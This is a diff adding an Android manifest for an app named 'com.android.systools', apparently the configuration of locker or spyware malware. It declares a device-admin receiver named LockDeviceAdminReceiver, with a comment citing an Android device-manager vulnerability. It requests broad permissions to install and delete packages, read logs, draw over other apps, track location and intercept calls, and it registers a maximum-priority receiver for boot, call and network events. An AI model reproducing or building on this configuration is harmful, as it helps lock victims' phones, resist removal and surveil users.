@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest android:versionCode="10" android:versionName="1.1.0" package="com.android.systools" xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-sdk android:minSdkVersion="7" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.READ_LOGS" />
+    <uses-permission android:name="com.android.systools.launcher.permission.INSTALL_SHORTCUT" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />   
+    <uses-permission android:name="android.permission.DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.FORCE_STOP_PACKAGES" />
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" /> 
+    <application android:label="@string/aname" android:icon="@android:drawable/sym_def_app_icon"  android:allowBackup="true">
+        <activity android:name="export.MainActivity" android:label="@string/aname" android:icon="@drawable/icon">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.CREATE_SHORTCUT" />
+            </intent-filter>
+        </activity>
+        <receiver android:name="export.LockDeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:description="@string/aname">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/admin" />
+            <!-- 
+            	http://www.2cto.com/Article/201306/221477.html
+            	Android设备管理器漏洞
+            	-->
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+             
+        </receiver>
+        <receiver android:name="export.LockAppWidgetProvider" android:label="@string/aname" android:icon="@drawable/icon">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
+                <action android:name="lock" />
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/provider" />
+        </receiver>
+
+        <activity android:name="export.MActivity" android:label="AndroidMic" />
+		<activity android:name="export.LActivity" android:exported="true" android:process=":remote" android:theme="@android:style/Theme.Translucent">  
+		    <intent-filter>                                 
+		        <action android:name="export.LActivity" />
+		        <category android:name="android.intent.category.DEFAULT" />   
+		    </intent-filter>  
+		</activity>
+        <service android:name="export.IService"  android:enabled="true" android:exported="true" />
+        <receiver android:name="export.MReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.ACTION_TIME_CHANGED" />
+                <action android:name="android.intent.action.ACTION_DATE_CHANGED" />
+                <action android:name="android.intent.action.ACTION_TIMEZONE_CHANGED" />
+                <action android:name="android.intent.action.ACTION_MEDIA_EJECT" />
+                <action android:name="android.intent.action.ACTION_PACKAGE_ADDED" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.ANY_DATA_STATE" />
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+                <action android:name="android.intent.action.MEDIA_UNMOUNTED" />
+                <action android:name="android.intent.action.MEDIA_REMOVED" />
+                <action android:name="android.intent.action.MEDIA_CHECKING" />
+                <action android:name="android.intent.action.MEDIA_EJECT" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.MAIN" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>        		 
+		        
+    </application>
+</manifest>
